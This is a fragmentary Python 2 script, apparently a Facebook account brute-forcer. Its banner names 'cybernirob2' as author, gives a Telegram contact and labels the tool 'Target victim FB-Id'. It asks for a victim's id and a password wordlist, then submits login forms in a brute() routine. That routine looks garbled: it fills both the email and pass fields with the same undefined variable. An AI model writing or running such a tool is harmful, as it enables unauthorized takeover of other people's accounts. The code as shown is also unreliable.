...
Created by CyberNirob 2 on 27/05/2022.
...
banner = """\033[36;1m
    ________  ______  __________     _   __________  ____  ____ 
  / ____/\ \/ / __ )/ ____/ __ \   / | / /  _/ __ \/ __ \/ __ )
 / /      \  / __  / __/ / /_/ /  /  |/ // // /_/ / / / / __  |
/ /___    / / /_/ / /___/ _, _/  / /|  // // _, _/ /_/ / /_/ / 
\____/   /_/_____/_____/_/ |_|  /_/ |_/___/_/ |_|\____/_____/ Boss
 
powerfull people make places powerfull👹  
   
     \x1b[1;97m Author   \033[31;1m:  \033[32mcybernirob2
     \x1b[1;97m Type     \033[31;1m:  \033[32mTarget victim FB-Id
     \x1b[1;97m Version  \033[31;1m:  \033[32m0.3
     \x1b[1;97m Contact  \033[31;1m:  \033[32mhttps://t.me/CyberNirob2
     \x1b[1;97m
"""
...
system("clear")
slowprint(banner)
email = str(raw_input("\033[37;1minput victim id \033[31;1m: \033[33;1m"))
passwordlist = str(raw_input("\033[37;1mDo you have any wordlist? input here \033[31;1m: \033[33;1m"))
...
def brute(password):
    ...
    site = br.open(login)
    br.select_form(nr = 0)
    br.form['email'] = nayemnai
    br.form['pass'] = nayemnai
    sub = br.submit()
    log = sub.geturl()
